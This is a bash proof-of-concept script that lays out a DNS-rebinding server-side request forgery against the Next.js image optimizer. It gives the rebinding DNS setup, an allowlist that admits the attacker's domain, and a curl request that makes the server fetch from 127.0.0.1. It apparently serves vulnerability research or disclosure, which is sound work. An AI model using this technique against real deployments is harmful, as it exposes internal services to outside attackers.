#!/bin/bash
#
# DNS Rebinding SSRF Attack - Real Scenario
# ==========================================
#
# This demonstrates exploiting the TOCTOU vulnerability in:
# packages/next/src/server/image-optimizer.ts lines 716-741
#
# ATTACK SCENARIO:
# 1. Victim visits page with <img src="/_next/image?url=http://attacker.com/image.png&w=100&q=75">
# 2. Next.js server fetches the image
# 3. DNS rebinding causes fetch to hit internal service (127.0.0.1)
# 4. Attacker gets response from internal service
#
# !! NO MITM REQUIRED - This is browser-exploitable !!
#

set -e

echo "=============================================="
echo " DNS Rebinding SSRF - Real Attack Setup"
echo "=============================================="
echo ""

echo "STEP 1: DNS REBINDING SETUP"
echo "==========================="
echo ""
echo "You need to configure a subdomain with DNS rebinding behavior."
echo "Option A: Use your own DNS server with:"
echo "  - ssrf.werz.xyz → TTL=0"
echo "  - First query: 91.99.139.110 (public IP)"
echo "  - Second query: 127.0.0.1 (internal)"
echo ""
echo "Option B: Use a single-IP approach for simpler testing:"
echo "  - Configure ssrf.werz.xyz → 127.0.0.1"
echo "  - Test if Next.js private IP check can be bypassed"
echo ""

echo "STEP 2: CONFIGURE NEXT.JS"
echo "========================="
echo "Already done - remotePatterns includes:"
echo "  - qyst.werz.xyz"
echo "  - *.werz.xyz"
echo ""

echo "STEP 3: ATTACKING"
echo "================="
echo ""
echo "Once DNS is configured, run:"
echo "curl 'http://localhost:3000/_next/image?url=http://ssrf.werz.xyz:3000/&w=64&q=75'"
echo ""
echo "If DNS rebinding works, Next.js will fetch from 127.0.0.1:3000"
echo "even though it thought it was fetching from ssrf.werz.xyz"
echo ""

echo "STEP 4: ALTERNATIVE - TEST THE CODE PATH DIRECTLY"
echo "=================================================="
echo ""
echo "For simpler verification, we can test what happens when:"
echo "1. isPrivateIp check passes"
echo "2. fetch() hits a domain that resolves to internal IP"
echo ""

# For now, let's test with a service that might demonstrate the race
echo "Testing with httpbin.org (allowed domain)..."
curl -sI "http://localhost:3000/_next/image?url=https://httpbin.org/image/png&w=64&q=75" | head -5 || echo "Server not running"

echo ""
echo "=============================================="
echo " For full PoC, configure DNS as described above"
echo "=============================================="
